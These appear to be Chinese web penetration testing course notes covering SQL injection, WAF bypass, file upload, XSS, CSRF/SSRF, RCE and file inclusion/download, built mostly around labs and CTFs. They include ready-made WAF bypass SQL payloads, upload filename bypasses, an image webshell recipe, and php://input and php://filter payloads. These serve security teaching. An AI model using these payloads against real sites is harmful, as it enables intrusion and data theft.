+二次注入 cms白盒代码审计 一般出现在注册点
+
+ 
+
+**DNSlog**:解决了盲注不能回显数据，效率低的问题
+
+ 
+
+演示案例：
+
+²  sqlilabs-less21-cookie&amp;**加解密注入**（实际案例）
+
+²  sqlilabs-less24-post 登陆框&amp;**二次注入**（实际案例）
+
+²  sqlilabs-less9-load_file&amp;**dnslog** **带外注入**（实际案例）
+
+需要高权限用户 
+
+需要文件读取操作条件
+
+²  py-DnslogSqlinj-dnslog 注入演示脚本演示（实际案例）
+
+ 
+
+涉及资源：
+
+http://ceye.io/
+
+https://github.com/ADOOO/DnslogSqlinj
+
+ 
+
+DAY-18 WEB漏洞-SQL注入之堆叠及WAF绕过注入
+
+2022年8月20日
+
+18:25
+
+ 
+
+# #堆叠查询注入
+
+Stacked injections(堆叠注入):**sq****l**  **语句****(****多条****)****一起执行**
+
+不同的数据库支持不同，只有**mysql****支持堆叠注入**
+
+在 mysql 中, 主要是命令行中, 每一条语句结尾加;分号表示语句结束。
+
+**利用方式**：在查询时可以同时进行插入（删除、更新）数据
+
+ 
+
+# #phpstudy+safedog 安装找不到服务解决
+
+ 
+
+# #市面上常见的 waf 产品列表分析-wafw00f工具
+
+ 
+
+# #部分 bypass sqlinject payload
+
+注释符、换行符绕过
+
+id=1  union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23
+
+ 
+
+id=-1  union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23
+
+ 
+
+id=-1%20union%20/*!44509select*/%201,2,3%23
+
+ 
+
+id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23
+
+参数污染
+
+**id=1/\**&amp;id=-1%20union%20select%201,2,3%23\*/**
+
+**实际接受的值：****id=-1** **union** **select** **1,2,3****#*****/**
+
+ 
+
+id=-1 %20union%20all%23%0a%20select%201,2,3%23 -1  %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
+
+ 
+
+# 演示案例：
+
+**² Sqlilabs-Less38-****堆叠注入****(****多语句****)** **√**
+
+**² WAF** **部署****-****安全狗****,****宝塔等** **waf** **搭建部署**
+
+**²** **简要讲解安全狗****,****宝塔等防护** **waf** **策略规则**
+
+**²** **简要演示安全狗** **bypass sqlinject** **防护规则**
+
+**²** **实测简易** **CMS** **头部注入漏洞** **Bypass** **原理分析**
+
+ 
+
+# 涉及资源：
+
+https://www.cnblogs.com/backlion/p/9721687.html 堆叠注入详解
+
+https://blog.csdn.net/nzjdsds/article/details/93740686 phpstudy搭建安全狗
+
+ 
+
+# #应用层
+
+**大小写****/****关键字替换**
+
+id=1' UnIoN/**/SeLeCT 1,user()   联合查询
+
+Hex()  bin() 等价于 ascii()
+
+Sleep() 等价于 benchmark()
+
+Mid()substring() 等价于 substr()
+
+@@user 等价于 User()
+
+@@Version 等价于 version()
+
+**各种编码、大小写，****URL****，****hex****，****%0A** **等**
+
+**注释使用**
+
+// -- --+ # /**/ + :%00 /!**/等 **换行符**
+
+**再次循环**
+
+union==uunionnion
+
+**等价替换**
+
+user()=@@user() and=&amp; or=| ascii=hex  等
+
+**参数污染**
+
+?id=1&amp;id=2&amp;id=3
+
+**编码解码及加密解密**
+
+s-&gt;%73-&gt;%25%37%33
+
+hex,unlcode,base64 等
+
+**更改请求提交方式**
+
+GET  POST COOKIE 等
+
+POST-&gt;multipart/form-data
+
+**中间件** **HPP** **参数污染**
+
+ 
+
+# #数据库特性
+
+**1****、****Mysql** **技巧**
+
+（1）mysql 注释符有三种：#、/*...*/、-- ... (注意--后面有一个空格)
+
+（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]
+
+（3）特殊符号：%a 换行符
+
+可结合注释符使用%23%0a，%2d%2d%0a。
+
+（3）内联注释：
+
+/*!UnIon12345SelEcT*/ 1,user() //数字范围 1000-50540
+
+（4）mysql 黑魔法
+
+select{x  username}from {x11 test.admin};
+
+**2****、****SQL Server** **技巧**
+
+（1）用来注释掉注射后查询的其余部分：
+
+/* C  语言风格注释
+
+--  SQL 注释
+
+;  00％ 空字节
+
+（2）空白符：[0x01-0x20]
+
+（3）特殊符号：%3a 冒号
+
+id=1 union:select  1,2 from:admin
+
+（4）函数变形：如 db_name[空白字符]()
+
+**3****、****Oracle** **技巧**
+
+（1）注释符：--、/**/
+
+（2）空白字符：[0x00,0x09，0x0a-0x0d,0x20]
+
+**4.****配合** **FUZZ**
+
+select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】
+
+from【位置五】admin
+
+# #逻辑层
+
+1、逻辑问题
+
+（1）云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。
+
+（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。
+
+（3）HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致 HTTPS 有 WAF 防护，HTTP没有防护，直接访问 HTTP 站点绕过防护。
+
+（4）特殊符号%00，部分 waf 遇到%00 截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从 而 导  致 Bypass 。 比 如 ： id=1%00and 1=2 union select 1,2,column_name  from information_schema.columns
+
+2、性能问题
+
+猜想 1：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。
+
+猜想 2：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向量时超出了其缓冲区长度就会引发 bug，从而实现绕过。
+
+例子 1：
+
+?id=1 and (select  1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9
+
+PS：0xA*1000 指 0xA 后面”A"重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。
+
+例子 2：
+
+?a0=0&amp;a1=1&amp;.....&amp;a100=100&amp;id=1  union select 1,schema_name,3 from
+
+INFORMATION_SCHEMA.schemata
+
+备注：获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。
+
+**3****、白名单**
+
+- 方式一：IP 白名单 
+
+从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情况。
+
+测试方法：修改 http 的 header 来 bypass waf
+
+**X-forwarded-for**
+
+**X-remote-IP**
+
+**X-originating-IP**
+
+**x-remote-addr**
+
+**X-Real-ip**
+
+- 方式二：静态资源 
+
+特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。
+
+http://10.9.9.201/sql.php?id=1
+
+http://10.9.9.201/sql.php/1.js?id=1
+
+备注：Aspx/php 只识别到前面的.aspx/.php 后面基本不识别
+
+- 方式三：url 白名单 
+
+为了防止误拦，部分 waf 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势:
+
+伪造各种搜索引擎的爬虫，白名单headers
+
+ 
+
+ 
+
+DAY-19 WEB漏洞-SQL注入之SQLmap注入绕过
+
+2022年8月7日
+
+18:26
+
+在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用
+
+层、WAF 层等，以便我们更灵活地去构造 Payload，从而可以和各种
+
+WAF 进行对抗，甚至绕过安全防御措施进行漏洞利用.
+
+ 
+
+# 演示案例：
+
+**²** **简要其他绕过方式学习**
+
+**² FUZZ** **绕过脚本结合编写测试**
+
+**²** **阿里云盾防** **SQL** **注入简要分析**
+
+**²** **安全狗****+****云盾** **SQL** **注入插件脚本编写**
+
+ 
+
+**%23x%0aunion%23x%0Aselect%201,2,3**
+
+**%20union%20/\*!44509select\*/%201,2,3** **版本号绕过**
+
+**%20/\*!44509union\*/%23x%0aselect%201,2,3**
+
+**id=1/\**&amp;id=-1%20union%20select%201,2,3%23\*/**
+
+**%20union%20****all****%23%0a%20select%201,2,3%23** 
+
+ 
+
+**搜索引擎**  **爬虫****Http****头**
+
+**Sqlmap** **绕安全狗**
+
+**--delay****参数**
+
+**自定义****U-A****请求头**
+
+
+
+DAY-20 WEB漏洞-文件上传之基础及过滤方式
+
+2022年8月7日
+
+18:26
+
+什么是文件上传漏洞？
+
+自定义上传文件类型 php、jsp、asp、aspx 上传webshell后门文件
+
+文件上传漏洞有哪些危害？
+
+文件上传漏洞如何查找及判断？
+
+文件上传漏洞有哪些需要注意的地方？
+
+关于文件上传漏洞在实际应用中的说明？
+
+ 
+
+演示案例：
+
+**²** **常规****文件上传地址****的获取说明**
+
+upload.php目录扫描
+
+**²** **不同格式下的文件类型后门测试**
+
+php、asp、aspx、jsp
+
+**²** **配合解析漏洞下的文件类型后门测试**
+
+nginx解析漏洞复现
+
+**²** **本地文件上传漏洞靶场环境搭建测试**
+
+upload-labs靶场
+
+**²** **某** **CMS** **及** **CVE** **编号文件上传漏洞测试**
+
+cve-2018-2894 weblogic 任意文件上传漏洞复现
+
+ 
+
+ 
+
+DAY-21 WEB漏洞-文件上传之后端黑白名单绕过
+
+2022年8月7日
+
+18:26
+
+- **文件上传常见验证：** 
+
+1. 后缀名，类型，文件头等 
+2. 后缀名：黑名单，白名单 
+3. 文件类型：MIME 信息 
+4. 文件头：内容头信息 
+
+ 
+
+黑名单：
+
+php、jsp、asp、aspx、cgi、war
+
+ 
+
+php5、Phtml  （绕过）
+
+ 
+
+白名单：
+
+jpg、png、zip、rar、gif、等
+
+ 
+
+MIME信息：Content-Type类型
+
+文件头信息：
+
+ 
+
+简要上传表单代码分析解释
+
+ 
+
+- 演示案例： 
+
+²  uploadlabs 关卡分析
+
+ 
+
+ 
+
+ 
+
+DAY-22 WEB漏洞-文件上传之内容逻辑数组绕过
+
+2022年8月29日
+
+17:33
+
+**图片一句话制作方法：**
+
+copy 1.png /b +  shell.php /a webshell.jpg
+
+在图片里面写入后门代码
+
+需要结合文件包含漏洞，去执行php后门代码
+
+ 
+
+**文件头检测**
+
+不同的文件类型，文件头不同
+
+getimagesize()
+
+图像文件信息判断
+
+ 
+
+逻辑安全-**二次渲染**
+
+逻辑安全-**条件竞争**
+
+条件竞争：文件占用时，不能对其进行其他操作 利用：**不断发包访问抢占**
+
+ 
+
+目录命名-x.php/.  绕过
+
+脚本函数漏洞-CVE-2015-2348
+
+数组接受+目录命名
+
+ 
+
+ 
+
+演示案例：
+
+l  Uploadlabs-pass13-20 关卡测试
+
+l  CVE-2017-12615-上传-Tomcat
+
+l  中间件解析漏洞+配合文件上传测试
+
+¡  IIS-上传-解析-(panfei806)
+
+¡  Apache-上传-解析-vulhub
+
+¡  Nginx-上传-解析-vulhub
+
+ 
+
+ 
+
+涉及资源：
+
+https://www.smi1e.top/文件解析漏洞总结/
+
+腾讯文档-与我共享-Web 中间件常见漏洞总结.pdf
+
+https://pan.baidu.com/s/1UfHvoS1BlYZ8SXgUKXnOxw 提取码：7ucg
+
+ 
+
+ 
+
+ 
+
+DAY-23 WEB漏洞-文件上传之解析漏洞编辑器安全
+
+2022年8月7日
+
+18:27
+
+![img](file6280.files/image017.png)
+
+ 
+
+各个平台解析漏洞讲解
+
+IIS,Apache,Nginx
+
+各个 WEB 编辑器安全讲解
+
+https://navisec.it/编辑器漏洞手册/
+
+各个 CMS 文件上传简要讲解
+
+wordpress,phpcms,
+
+ 
+
+# 演示案例：
+
+## 几种中间件解析漏洞简要演示
+
+参考共享的中间件漏洞 PDF
+
+IIS6/7 简要说明-本地搭建
+
+Apache  配置安全--vulhub
+
+Apache 解析漏洞-低版本
+
+Apache  换行解析-vulhub
+
+Nginx 解析漏洞-vulhub
+
+Nginx  文件名逻辑-vulhub
+
+ 
+
+## 几种常见 WEB  编辑器简要演示
+
+Fckeditor exp 利用
+
+ueditor 漏洞利用
+
+ 
+
+## 几种常见 CMS  文件上传简要演示
+
+通达 OA 系统
+
+ 
+
+## 贴近实际应用下的以上知识点演示
+
+判断中间件平台，编辑器类型或 CMS  名称进行测试
+
+涉及资源：
+
+https://navisec.it/编辑器漏洞手册/
+
+https://www.jb51.net/softs/75619.html
+
+ 
+
+ 
+
+ 
+
+DAY-24 WEB漏洞-文件上传之WAF绕过及安全修复
+
+2022年8月7日
+
+18:27
+
+\#上传参数名解析：明确哪些东西能修改？
+
+Content-Disposition：一般可更改
+
+name：表单参数值，不能更改
+
+filename：文件名，可以更改
+
+Content-Type：文件  MIME，视情况更改
+
+\#常见绕过方法：
+
+数据溢出-防匹配(xxx...)
+
+符号变异-防匹配（' " ;）
+
+数据截断-防匹配(%00 ;  换行)
+
+重复数据-防匹配(参数多次)
+
+\#Payload:
+
+大量垃圾数据缓冲溢出(Content-Disposition,filename  等)
+
+filename=x.php
+
+filename="x.php
+
+filename='x.php
+
+filename="a.jpg;.php";
+
+filename="a.php%00.jpg"
+
+filename="Content-Disposition:  form-data; name="upload_file";x.php"
+
+filename="x.jpg";filename="x.jpg";.....filename="x.php";
+
+filename="xxx/x.jpg"
+
+filename="x.php"
+
+ 
+
+# #文件上传安全修复方案
+
+后端验证：采用服务端验证模式
+
+后缀检测：基于黑名单，白名单过滤
+
+MIME  检测：基于上传自带类型检测
+
+内容检测：文件头，完整性检测
+
+自带函数过滤：参考 uploadlabs  函数
+
+自定义函数过滤：function  check_file(){}
+
+WAF  防护产品：宝塔，云盾，安全公司产品等
+
+![img](file6280.files/image018.png)
+
+# 演示案例：
+
+² 上传数据包参数对应修改测试
+
+²  Safedog+云服务器+uploadlabs 测试
+
+²  Safedog+云服务器+uploadlabs_fuzz 测试
+
+² 文件上传安全修复方案-函数自定义及  WAF
+
+涉及资源：
+
+https://github.com/fuzzdb-project/fuzzdb
+
+https://github.com/TheKingOfDuck/fuzzDicts
+
+ 
+
+ 
+
+ 
+
+DAY-25 WEB漏洞-XSS跨站之原理分类及攻击手法
+
+2022年8月7日
+
+18:28
+
+先修知识：JavaScript语句,php基本语法
+
+ 
+
+![img](file6280.files/image019.png)
+
+ 
+
+ 
+
+ 
+
+![img](file6280.files/image020.png)
+
+# #XSS 跨站漏洞产生原理，危害，特点
+
+## 本质
+
+跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页
+
+内容、会话和cookie等各种内容。
+
+xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。
+
+## 产生层面
+
+产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果。
+
+## 输出类函数类
+
+常见的输出函数有：print、print_r、echo、printf、sprintf、die、var_dump、var_export。
+
+## 危害影响
+
+1、窃取网页浏览中的cookie值
+
+documen.cookie
+
+2、劫持流量实现恶意跳转
+
+#window.location.href="http://www.baidu.com";
+
+## 浏览器内核版本
+
+利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）
+
+ 
+
+## 常出现的场景
+
+文章发表、评论、留言、注册资料的地方、修改资料的地方等
+
+ 
+
+# #XSS 跨站漏洞分类：**反射，存储，****DOM**
+
+## 反射型
+
+攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞。
+
+ 
+
+漏洞发现：
+
+①  判断有没有过滤一些特殊的字符
+
+输入一组"特殊字符+唯一识别字符"，点击提交后，查看返回源码，是否做对应的处理。
+
+比如对比输出的字符和输出的字符，可以看到有些字符被过滤了
+
+②  注入代码
+
+查看源代码，观察输入内容如何输出
+
+
+
+③  插入代码
+
+构造js语句实现闭合
+
+
+
+④  利用xss漏洞
+
+将刚刚成功注入代码并能触发xss的网址通过电子邮件等方式发送给对方的手中，如果结合xss平台，对方点击了链接，就能得到对方的cookie等信息
+
+ 
+
+## 存储型
+
+原理：
+
+存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。
+
+攻击方式：
+
+这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行。
+
+ 
+
+## DOM型
+
+ 
+
+1、原理
+
+文档对象模型Document  Object  Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分。
+
+ 
+
+DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM  XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情。
+
+ 
+
+DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。
+
+ 
+
+基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。
+
+ 
+
+攻击方式：
+
+用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞。
+
+ 
+
+# #' onclick="alert(123)"&gt;
+
+# #XSS 常规攻击手法
+
+# 平台，工具，结合其他等
+
+ 
+
+# **#cookie session**
+
+用户凭据：通过凭据可以判断对方身份信息
+
+## cookie 
+
+存储本地存活时间较长  小中型
+
+**用户的凭据**：通过凭据可以判断对方身份信息
+
+## session
+
+会话  存储服务器存活时间较短 大型
+
+ 
+
+# 演示案例：
+
+²  本地环境 XSS 漏洞原理讲解
+
+² XSS  漏洞各个分类差异讲解
+
+² XSS  漏洞代码绕过靶场使用
+
+² XSS  平台及工具简要演示测试
+
+# 涉及资源
+
+https://github.com/do0dl3/xss-labs
+
+ 
+
+ 
+
+ 
+
+DAY-26 WEB漏洞-XSS跨站之订单及Shell箱子反杀记
+
+2022年8月7日
+
+18:28
+
+# #XSS 平台及工具使用
+
+## 1.在线xss平台
+
+## 2.beef
+
+## 3.postman
+
+#  
+
+# #Webshell 后门中的后门
+
+# #Session 与 Cookie 获取问题
+
+## document.cookie 等
+
+## 配合读取 phpinfo 等信息源码等
+
+ 
+
+ 
+
+# 演示案例：
+
+l  某营销订单系统 XSS 盲打_平台
+
+ 
+
+l  某 Shell 箱子系统 XSS 盲打_工具
+
+ 
+
+l  其他参考应用案例-后台权限维持
+
+ 
+
+l  工具 Http/s 数据包提交 Postman 使用
+
+ 
+
+# 涉及资源：
+
+ 
+
+https://github.com/tennc/webshell
+
+https://www.postman.com/downloads/
+
+https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw 提取码：
+
+Xiao
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+DAY-27 WEB漏洞-XSS跨站之代码及httponly绕过
+
+2022年8月13日
+
+9:43
+
+# 代码类过滤：Xsslabs
+
+# HttpOnly 属性过滤防读取
+
+httponly： 防止js脚本读取cookie
+
+ 
+
+<script>alert(Hi~)</script>
+
+ 
+
+# 绕过 httponly的方法：
+
+浏览器未保存帐号密码：需要 xss 产生登录地址，利用表单劫持
+
+浏览器保存帐号密码：浏览器读取帐号密码
+
+ 
+
+ 
+
+演示案例：
+
+Ø  HttpOnly 安全过滤测试
+
+Ø  HttpOnly 安全过滤绕过思路
+
+Ø  Xsslabs 关卡代码过滤绕过测试
+
+ 
+
+ 
+
+涉及资源：
+
+https://github.com/do0dl3/xss-labs
+
+ 
+
+ 
+
+ 
+
+DAY-28 WEB漏洞-XSS跨站之WAF绕过及安全修复
+
+2022年8月13日
+
+21:08
+
+# #常规 WAF 绕过思路
+
+## 标签语法替换
+
+script、onclick、javascript、href、
+
+## 特殊符号干扰
+
+\#、*、\(结束)
+
+## 提交方式更改
+
+get、post
+
+## 垃圾数据溢出
+
+## 加密解密算法
+
+Unicode编码
+
+## 结合其他漏洞绕过
+
+# #自动化工具说明
+
+**XSStrike**  主要特点反射和 DOM XSS 扫描
+
+多线程爬虫
+
+Context 分析
+
+可配置的核心
+
+检测和规避 WAF
+
+老旧的 JS 库扫描
+
+智能 payload 生成器
+
+手工制作的 HTML &amp; JavaScript 解析器
+
+强大的 fuzzing 引擎
+
+盲打 XSS 支持
+
+高效的工作流
+
+ 
+
+# #安全修复方案
+
+开启 httponly, 输入过滤，输出过滤等
+
+配置xss过滤器 filter
+
+PHP: http://www.zuimoge.com/212.html
+
+JAVA: https://www.cnblogs.com/baixiansheng/p/9001522.html
+
+## #JAVA XSS 平台练习
+
+ 
+
+# 演示案例：
+
+Ø  手工探针 XSS 绕过 WAF 规则
+
+Ø  自动化 XSS 绕过 WAF 测试演示
+
+Ø  Fuzz 下 XSS 绕过 WAF 测试演示
+
+Ø  关于 XSS 跨站安全修复建议测试
+
+ 
+
+ 
+
+# 涉及资源：
+
+https://gitee.com/open_source_international/imxss java xss平台
+
+https://github.com/3xp10it/xwaf 自动绕waf工具
+
+https://xssfuzzer.com/fuzzer.html fuzz平台
+
+https://github.com/s0md3v/XSStrike  xss工具  py3
+
+https://bbs.pediy.com/thread-250852.htm  绕waf博客
+
+https://github.com/TheKingOfDuck/fuzzDicts  fuzz字典
+
+ 
+
+ 
+
+ 
+
+DAY-29 WEB漏洞-CSRF及SSRF漏洞案例讲解
+
+2022年8月17日
+
+18:15
+
+
+
+ 
+
+\#CSRF  漏洞解释，原理等
+
+\#CSRF  漏洞检测，案例，防御等
+
+\#防御方案
+
+1、当用户发送重要的请求时需要输入原始密码
+
+2、设置随机 Token
+
+3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，
+
+黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）
+
+4、设置验证码
+
+5、限制请求方式只能为 POST
+
+ 
+
+\#SSRF  漏洞解释，原理等
+
+\#SSRF  漏洞检测，案例，防御等
+
+各个协议调用探针：http,file,dict,ftp,gopher 等
+
+漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等
+
+http://192.168.64.144/phpmyadmin/
+
+[file:///D:/www.txt](file:///D:/www.txt)
+
+dict://192.168.64.144:3306/info
+
+[ftp://192.168.64.144:21](ftp://192.168.64.144:21)
+
+演示案例：
+
+²  Pikachu_CSRF 案例及 Burp 检测
+
+²  Pikachu_CSRF 防御 Token 测试测试
+
+²  SSRF_PHP,JAVA 漏洞代码协议运用
+
+²  SSRF_漏洞代码结合某漏洞利用测试
+
+²  SSRF 实战_图片加载翻译转码等应用说明
+
+涉及资源：
+
+https://pan.baidu.com/s/1bp96ECJ
+
+https://www.t00ls.net/articles-41070.html
+
+
+
+DAY-30 WEB漏洞-RCE代码及命令执行漏洞全解
+
+2022年8月17日
+
+18:17
+
+在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用
+
+代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代
+
+码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏
+
+洞。同样调用系统命令处理，将造成命令执行漏洞.
+
+ 
+
+\#代码执行 RCE 漏洞
+
+原理，攻击，检测，危害，修复等
+
+\#命令执行 RCE 漏洞
+
+原理，攻击，检测，危害，修复等
+
+\#RCE  漏洞产生相关性函数
+
+演示案例：
+
+²  墨者靶场黑盒功能点命令执行-应用功能
+
+²  墨者靶场白盒代码及命令执行-代码分析
+
+²  墨者靶场黑盒层 RCE 漏洞检测-公开漏洞
+
+²  Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面
+
+²  一句话 Webshell 后门原理代码执行-拓展说明
+
+ 
+
+# 涉及资源：
+
+ 
+
+https://www.cnblogs.com/ermei/p/6689005.html
+
+http://blog.leanote.com/post/snowming/9da184ef24bd
+
+https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe
+
+https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe
+
+https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe
+
+ 
+
+ 
+
+ 
+
+DAY-31 WEB漏洞-文件操作之文件包含漏洞全解
+
+2022年8月17日
+
+18:19
+
+ 
+
+ 
+
+演示案例：
+
+Ø  本地文件包含代码测试-原理
+
+Ø  远程文件包含代码测试-原理
+
+Ø  各种协议流提交流测试-协议
+
+Ø  某 CMS 程序文件包含利用-黑盒
+
+Ø  CTF-南邮大,i 春秋百度杯真题-白盒
+
+php://filter/read=convert.base64-encode/resource=index.php
+
+http://e5369bfd1d9c4bc4af66983b843eb0f3760d8c19751b457d.changame.ichunqiu.com/?path=php://in
+
+put Post:<!--?php  system('ls');?-->
+
+<p><a href="http://e5369bfd1d9c4bc4af66983b843eb0f3760d8c19751b457d.changame.ichunqiu.com/?path=php://fil">http://e5369bfd1d9c4bc4af66983b843eb0f3760d8c19751b457d.changame.ichunqiu.com/?path=php://fil</a></p>
+<p>ter/read=convert.base64-encode/resource=dle345aae.php</p>
+<p>涉及资源：</p>
+<p><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=0">https://www.ichunqiu.com/battalion?t=1&amp;r=0</a></p>
+<p><a href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p>
+<p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
+<p><a href="https://pan.baidu.com/s/1x_mwVF--xxmoKAvDJ8mRsw">https://pan.baidu.com/s/1x_mwVF--xxmoKAvDJ8mRsw</a> 提取码：xiao</p>
+<p>DAY-32 WEB漏洞-文件操作之文件下载读取全解</p>
+<p>2022年8月17日</p>
+<p>18:28</p>
+<p>#文件下载，读取</p>
+<p>原理，检测，利用，修复等</p>
+<p>#利用</p>
+<p>数据库配置文件下载或读取后续</p>
+<p>接口密匙信息文件下载或读取后续</p>
+<p>#文件名，参数值，目录符号</p>
+<p>read.xxx?filename=</p>
+<p>down.xxx?filename=</p>
+<p>readfile.xxx?file=</p>
+<p>downfile.xxx?file=</p>
+<p>../  ..\ .\ ./等</p>
+<p>%00 ?  %23 %20 .等</p>
+<p>&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、</p>
+<p>WEB-INF</p>
+<p>1.文件被解析，则是文件包含漏洞</p>
+<p>2.显示源代码，则是文件读取漏洞</p>
+<p>3.提示文件下载，则是文件下载漏洞</p>
+<p>下载或文件读取漏洞：</p>
+<p>对应文件：配置文件（数据库，平台，各种等）</p>
+<p>#各种协议调用配合</p>
+<p>#Javaweb 文件下载代码</p>
+<p><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
+<p>&lt;%@ page  language=”java” import=”java.util.*” pageEncoding=”UTF-8”%&gt;</p>
+<p>&lt;%</p>
+<p>String path =  request.getContextPath();</p>
+<p>String basePath  =</p>
+<p>request.getScheme()+”://“+request.getServerName()+”:”+request.getServerPort()+path+”/“;</p>
+<p>%&gt;</p>
+<p><a href="/download/DownloadServlet?filename=1.jpg">文件下载</a></p>
+<p>public void  doGet(HttpServletRequest request, HttpServletResponse response)</p>
+<p>throws  ServletException, IOException {</p>
+<p>response.setCharacterEncoding(“UTF-8”);</p>
+<p>//设置 ContentType 字段值</p>
+<p>response.setContentType(“text/html;charset=utf-8”);</p>
+<p>//获取所要下载的文件名称</p>
+<p>String filename =  request.getParameter(“filename”);</p>
+<p>//下载文件所在目录</p>
+<p>String folder =  “/filename/“;</p>
+<p>//通知浏览器以下载的方式打开</p>
+<p>response.addHeader(“Content-type”,  “appllication/octet-stream”);</p>
+<p>response.addHeader(“Content-Disposition”,  “attachment;filename=”+filename);</p>
+<p>//通知文件流读取文件</p>
+<p>InputStream in =  getServletContext().getResourceAsStream(folder+filename);</p>
+<p>//获取 response 对象的输出流</p>
+<p>OutputStream out =  response.getOutputStream();</p>
+<p>byte[] buffer =  new byte[1024];</p>
+<p>int len;</p>
+<p>//循环取出流中的数据</p>
+<p>while((len =  in.read(buffer)) != -1){</p>
+<p>out.write(buffer,0,len);</p>
+<p>}</p>
+<p>}</p>
+<p>涉及案例：</p>
+<p>Ø  Pikachu-文件下载测试-参数</p>
+<p>Ø  Zdns-文件下载真实测试-功能点</p>
+<p>Ø  小米路由器-文件读取真实测试-漏洞</p>
+<p>Ø  RoarCTF2019-文件读取真题复现-比赛</p>
+<p>Ø  百度杯 2017 二月-Zone 真题复现-比赛拓展</p>
+<p>爬虫扫描地址-分析参数名参数值-文件操作安全-对应脚本</p>
+<p>修改提交方式测试-读取 WEB 配置文件 WEB-INF/web.xml</p>
+<p>访问读取对应地址-访问读取 flag 对应 class 文件-</p>
